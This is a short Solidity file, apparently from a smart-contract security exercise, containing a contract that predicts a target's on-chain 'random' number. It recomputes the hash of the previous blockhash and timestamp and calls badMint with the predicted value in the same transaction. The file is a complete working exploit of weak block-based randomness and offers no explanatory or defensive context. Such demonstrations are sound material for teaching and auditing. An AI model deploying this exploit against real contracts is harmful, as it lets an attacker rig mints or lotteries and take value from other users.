// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "./BadRandom.sol";

contract AttacBadRandom {
    function attacBadMint(BadRandom mintAddr) external {
        uint256 luckNum = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        ) % 100;

        mintAddr.badMint(luckNum);
    }
}
